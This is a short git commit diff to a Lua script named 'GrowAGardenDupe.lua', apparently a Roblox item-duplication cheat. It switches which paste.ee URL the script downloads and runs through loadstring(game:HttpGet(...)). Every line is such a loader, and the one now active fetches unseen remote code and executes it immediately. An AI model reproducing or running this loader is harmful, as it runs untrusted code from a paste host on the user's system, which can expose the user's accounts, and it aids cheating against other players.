9d3a6674ed6c21263ed07dcf9b769043d05c0976
NagiScripts <bruhjeff20@gmail.com>
2025-06-12 19:38:11 +0530

    Update GrowAGardenDupe.lua

--- GrowAGardenDupe.lua
+++ GrowAGardenDupe.lua
@@ -1,3 +1,3 @@
 --loadstring(game:HttpGet("https://paste.ee/r/laW5R37m"))()
---loadstring(game:HttpGet("https://paste.ee/r/r4ORfBJ2"))()
-loadstring(game:HttpGet("https://paste.ee/r/IC0nwrsi"))()
+loadstring(game:HttpGet("https://paste.ee/r/r4ORfBJ2"))()
+--loadstring(game:HttpGet("https://paste.ee/r/IC0nwrsi"))()
